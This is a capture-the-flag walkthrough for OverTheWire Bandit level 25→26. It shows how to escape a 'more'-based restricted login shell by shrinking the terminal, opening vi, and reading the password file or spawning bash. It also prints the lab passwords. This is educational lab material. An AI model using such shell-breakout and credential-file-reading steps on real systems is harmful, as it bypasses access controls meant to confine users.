# Bandit Level 25 → Level 26

| Key | Value |
|:---|:---|
| **Objective** | Bypass a restricted login shell (`/usr/bin/showtext` calling `more`) for user `bandit26` by shrinking terminal window dimensions to trigger pagination, escaping into `vi`, and reading `/etc/bandit_pass/bandit26`. |
| **Host** | `bandit.labs.overthewire.org` |
| **Port** | `2220` |
| **Username** | `bandit25` |
| **Password** | `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P` |
| **Key Commands** | `stty rows 5 cols 80`, `ssh -i bandit26.key ...`, `v`, `:e /etc/bandit_pass/bandit26` |

---

## 🎯 Challenge Description

Logging in to bandit26 from bandit25 should be fairly easy... The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

---

## 🔬 Technical Analysis

### Restricted Shell Breakout via Pager (`more`) and Editor (`vi`)
1. **Target Login Shell Inspection**:
   In `/etc/passwd`:
   `bandit26:x:11026:11026:bandit26:/home/bandit26:/usr/bin/showtext`
   Inspecting `/usr/bin/showtext`:
   ```bash
   #!/bin/sh
   export TERM=linux
   more ~/text.txt
   exit 0
   ```
2. **The `more` Pager Behavior**:
   - If terminal height (`LINES`) is greater than `text.txt` (~45 lines), `more` displays the full file and terminates immediately, invoking `exit 0` and closing the SSH connection.
   - If terminal height is small (e.g., 5 lines), `more` halts at `--More--(XX%)` waiting for scroll input.
3. **Escaping from `more` into `vi`**:
   Pressing **`v`** while `more` is paused spawns the configured editor (`vi`). Inside `vi`:
   - Read arbitrary files: `:e /etc/bandit_pass/bandit26`
   - Spawn full Bash: `:set shell=/bin/bash` followed by `:shell`.

---

## 🚀 Solution Walkthrough

### Step 1: Copy Private Key to Local Linux/WSL Environment
```bash
cp /mnt/d/CTF-test/bandit26.sshkey /tmp/bandit26.key
chmod 600 /tmp/bandit26.key
```

### Step 2: Force Small Terminal Dimensions (5 rows)
```bash
stty rows 5 cols 80
```

### Step 3: Connect to Bandit 26 via SSH
```bash
ssh -i /tmp/bandit26.key bandit26@bandit.labs.overthewire.org -p 2220
```

### Step 4: Trigger `vi` and Read Password
1. Terminal halts at `--More--(7%)`.
2. Press **`v`** to open `vi`.
3. Resize terminal back to normal.
4. Type in `vi`:
```text
:e /etc/bandit_pass/bandit26
```
Press `Enter`.

**Output:**
```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

---

## 🔑 Password Found

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

---

## 💡 Key Takeaways

- Custom restricted login scripts that rely on pagers (`more`/`less`) can be hijacked using terminal dimension manipulation.
- Command-line utilities spawned from within pagers (`v` for vi) inherit execution privileges of the active user.

---

[← Previous Level](level_24_to_25.md) | [📋 Summary](README.md) | [Next Level →](level_26_to_27.md)
